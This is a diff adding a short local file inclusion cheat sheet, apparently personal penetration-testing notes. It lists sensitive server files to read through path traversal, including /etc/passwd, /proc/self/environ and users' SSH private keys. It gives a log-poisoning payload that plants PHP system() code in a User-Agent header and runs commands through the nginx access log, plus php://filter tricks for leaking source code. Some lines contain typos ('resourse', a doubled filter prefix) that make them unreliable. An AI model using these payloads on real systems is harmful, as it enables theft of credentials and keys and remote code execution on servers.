@@ -1,0 +1,23 @@
+# Files to check or look for
+
+1) /etc/passwd
+2) /proc/self/environ    # to get environment variables on the server
+3) /proc/self/cmdline    # to get what user looged in or using the server
+4) /home/{user}/.ssh/id_rsa # to get ssh key of a user
+5) /var/log/nginx/access.log  # to get log file of nginx webserver, that may leads to RCE by injecting php code in User-Agent Header **-> ses example below
+6) /var/spool/mail/{user}
+7) /etc/nginx/sites-enabled/default   # get the configuration file of webserver "Nginx"
+# you may need to add this Header  -->  Range: bytes=200-1000
+
+
+# example on number 5
+
+User-Agent: <?php system($_GET['cmd']) ?>   # send a request of that
+
+GET /index.php?page=../../../../../../../var/log/nginx/access.log&cmd=whoami
+
+
+# Tricks can be useful for LFI
+
+1) php://filter/php://filter/convert.base64-encode/resourse={file_you_want_to_check}  # that whould return the php content of a page encoded in base64
+ex: GET /index.php?page=php://filter/php://filter/convert.base64-encode/resourse=login.php   # you can use it with html files
